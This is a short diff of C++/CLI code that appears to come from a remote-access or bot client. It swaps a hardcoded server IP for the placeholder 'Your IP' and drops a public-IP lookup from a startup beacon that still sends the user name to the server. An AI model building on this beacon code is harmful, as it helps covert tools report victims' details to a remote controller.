@@ -22,7 +22,7 @@ bool Live = false;
 void SendData(String^ data) {
     try {
         int PORT_NO = 7465;
-        String^ SERVER_IP = "62.65.226.66";
+        String^ SERVER_IP = "Your IP";
         TcpClient^ client = gcnew TcpClient(SERVER_IP, PORT_NO);
         client->SendTimeout = 5000;
         client->ReceiveTimeout = 5000;
@@ -38,8 +38,7 @@ void SendData(String^ data) {
 }
 void SendStartup() {
     WebClient^ nd = gcnew WebClient();
-    String^ ip = nd->DownloadString("https://wtfismyip.com/text");
-    SendData("NEW|" + ip + "@" + Environment::UserName + "+" + "64Bit");
+    SendData("NEW|" + "@" + Environment::UserName + "+" + "64Bit");
 
 }
 
